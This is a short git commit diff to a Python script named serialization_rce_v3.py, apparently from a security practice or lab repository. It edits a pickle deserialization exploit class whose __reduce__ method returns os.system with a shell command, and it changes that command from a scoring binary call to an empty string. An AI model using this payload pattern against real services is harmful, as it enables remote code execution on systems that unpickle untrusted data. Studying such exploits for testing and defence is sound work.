fc7e92dd3ee454fe20180677a995ed3de6ac5737
jonatan.martinez <jonatanmartinez@NB-26MD6P.local>
2020-10-26 21:15:33 -0300

    added pickle

--- pickle serialization/serialization_rce_v3.py
+++ pickle serialization/serialization_rce_v3.py
@@ -5,7 +5,7 @@ import base64
 #Python3
 class RCE(object):
     def __reduce__(self):
-        command = "/usr/local/bin/score 2737b949-b896-46ef-92b8-58418a763023" #Command to execute
+        command = "" #Command to execute
         return os.system, (command,)
 
 if __name__ == '__main__':
